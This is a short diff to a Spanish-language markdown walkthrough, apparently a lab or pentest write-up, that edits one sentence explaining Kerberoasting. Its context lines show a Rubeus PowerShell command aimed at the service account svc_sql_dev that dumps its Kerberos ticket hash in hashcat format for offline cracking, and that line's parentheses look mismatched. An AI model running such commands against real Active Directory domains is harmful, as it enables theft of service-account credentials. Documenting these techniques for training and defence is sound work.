@@ -53,7 +53,7 @@ tiene un SPN asociado, lo que la hace vulnerable a **Kerberoasting.**
 ---
 ## Fase 2: Kerberoasting Attack
 ¿Que es Kerberoasting?
-Es una tecnica que permite obtener hashes de cuentas de servicios con SPNs, que luego pueden ser crackeados offline.
+Es una tecnica que me permite obtener hashes de cuentas de servicios con SPNs, que luego pueden ser crackeados offline.
 ```bash 
 # Ejecutamos Kerberoasting conta el objetivo svc_sql_dev 
 [Rubeus.Program]::Main([String[]]) ( ' Kerberoast', '/user:svc_sql_dev', '/format:hashcat', '/nowrap'))
